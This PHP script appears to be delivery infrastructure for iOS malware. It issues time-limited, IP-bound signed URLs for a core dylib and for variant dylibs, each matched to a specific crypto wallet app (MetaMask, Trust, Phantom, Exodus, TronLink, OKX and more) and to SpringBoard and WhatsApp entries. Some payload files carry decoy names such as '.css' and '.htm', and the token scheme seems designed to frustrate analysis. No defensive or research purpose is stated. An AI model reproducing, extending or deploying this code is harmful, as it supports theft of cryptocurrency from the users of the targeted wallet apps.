<?php
/** daily.html 动态渲染器 v2（P1+P3 防护：变体文件 URL 走 /corefiles/ 统一分发+带 token）
 * 部署到 /www/wwwroot/i.131422.com/variants/daily_render.php
 * nginx: location = /sync/daily.html { fastcgi → 本文件 }
 * 与 corefile.php 共享 SECRET/签名逻辑（token 绑定请求 IP，5 分钟）
 * 变更：$base 改 corefiles；core.url 与 entries/springboard_entries URL 追加 tk/e 签名
 */
error_reporting(0);
header('Content-Type: application/json; charset=utf-8');
header('Cache-Control: no-store');

function _secret() {
    static $s = null;
    if ($s === null) {
        $s = getenv('COREFILE_SECRET');
        if (!$s) {
            $e = @file_get_contents(dirname(__DIR__) . '/.env');
            if (preg_match('/^COREFILE_SECRET=(.+)$/m', (string)$e, $m)) { $s = trim($m[1]); }
        }
        if (!$s) { http_response_code(500); exit('{"error":"no secret"}'); }
    }
    return $s;
}
function tok_sign($uri, $exp, $ip) {
    return hash_hmac('sha256', $uri . '|' . $exp . '|' . $ip, _secret());
}

$V = __DIR__;
$manifestFile = $V . '/manifest.json';
$templateFile = $V . '/daily_template.json';

if (!is_file($manifestFile) || !is_file($templateFile)) {
    http_response_code(200);
    $fallback = __DIR__ . '/daily.html.orig';
    if (is_file($fallback)) { header('Content-Type: application/json; charset=utf-8'); readfile($fallback); exit; }
    http_response_code(500);
    die('{"error":"not ready"}');
}

$manifest = json_decode(file_get_contents($manifestFile), true);
$template = json_decode(file_get_contents($templateFile), true);
if (!$manifest || !$template) { http_response_code(500); die('{"error":"bad manifest"}'); }

$active = $manifest['active'] ?? 'set0';
$set = $manifest['sets'][$active] ?? [];
$asIp = $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';

/** 生成带 token 的 corefiles URL */
function gw_url($path, $ip) {
    // $path 形如 /corefiles/variants/set0/xxx
    $exp = time() + 300;                       // 5 分钟
    $tk  = tok_sign($path, $exp, $ip);
    return 'https://wpsdz.com' . $path . '?tk=' . $tk . '&e=' . $exp;
}

function variant_url($fileKey, $set, $active, $ip) {
    if (isset($set[$fileKey])) {
        $info = $set[$fileKey];
        $path = '/corefiles/variants/' . $active . '/' . $info['file'];
        return array('url' => gw_url($path, $ip), 'sha256' => $info['sha256'], 'size' => $info['size']);
    }
    return null;
}

// core.url 覆盖（带 token）
if (isset($set['core_a5.dylib'])) {
    $ci = $set['core_a5.dylib'];
    $path = '/corefiles/variants/' . $active . '/' . $ci['file'];
    $template['core']['url'] = gw_url($path, $asIp);
    $template['core']['sha256'] = $ci['sha256'];
    $template['core']['size'] = $ci['size'];
}

$fileAlias = array(
    'com.bitkeep.os' => 'aware_retreat.css',
    'com.apple.springboard' => 'future-destroy.htm',
    'com.bitpie.wallet' => 'wallet01_com_bitpie_wallet.dylib',
    'coin98.crypto.finance.insights' => 'wallet02_coin98_crypto_finance_insights.dylib',
    'org.toshi.distribution' => 'wallet03_org_toshi_distribution.dylib',
    'exodus-movement.exodus' => 'wallet04_exodus-movement_exodus.dylib',
    'im.token.app' => 'wallet05_im_token_app.dylib',
    'com.kyrd.krystal.ios' => 'wallet06_com_kyrd_krystal_ios.dylib',
    'io.metamask.MetaMask' => 'wallet07_io_metamask_MetaMask.dylib',
    'org.mytonwallet.app' => 'wallet08_org_mytonwallet_app.dylib',
    'app.phantom' => 'wallet09_app_phantom.dylib',
    'com.skymavis.Genesis' => 'wallet10_com_skymavis_Genesis.dylib',
    'com.solflare.mobile' => 'wallet11_com_solflare_mobile.dylib',
    'com.global.wallet.ios' => 'wallet12_com_global_wallet_ios.dylib',
    'com.tonhub.app' => 'wallet13_com_tonhub_app.dylib',
    'com.jbig.tonkeeper' => 'wallet14_com_jbig_tonkeeper.dylib',
    'com.tronlink.hdwallet' => 'wallet15_com_tronlink_hdwallet.dylib',
    'com.sixdays.trust' => 'wallet16_com_sixdays_trust.dylib',
    'com.uniswap.mobile' => 'wallet17_com_uniswap_mobile.dylib',
    'com.okex.OKExAppstoreFull' => 'wallet18_com_okex_OKExAppstoreFull.dylib',
    'com.meta.webclip' => 'swap-ritual.ts',
    'com.meta.whatsapp.notnotify' => 'short_thing.js',
);

foreach (array('entries' => 'bundleId', 'springboard_entries' => 'uniqueId') as $sec => $idKey) {
    if (!isset($template[$sec])) continue;
    foreach ($template[$sec] as $k => $e) {
        $fkey = $fileAlias[$e[$idKey] ?? ''] ?? null;
        if ($fkey && isset($set[$fkey])) {
            $vi = $set[$fkey];
            $path = '/corefiles/variants/' . $active . '/' . $vi['file'];
            $template[$sec][$k]['url'] = gw_url($path, $asIp);
            $template[$sec][$k]['sha256'] = $vi['sha256'];
            $template[$sec][$k]['size'] = $vi['size'];
        }
    }
}
// 【坑七修复 v2 · 2026-09-10】flags 为空时必须序列化成 JSON 对象 {}，不能是 []（详见 daily_render.php 同段注释）。
foreach (array('entries', 'springboard_entries') as $sec) {
    if (!isset($template[$sec]) || !is_array($template[$sec])) continue;
    foreach ($template[$sec] as $k => $e) {
        if (isset($e['flags']) && is_array($e['flags']) && count($e['flags']) === 0) {
            $template[$sec][$k]['flags'] = new stdClass();
        }
    }
}
echo json_encode($template, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);
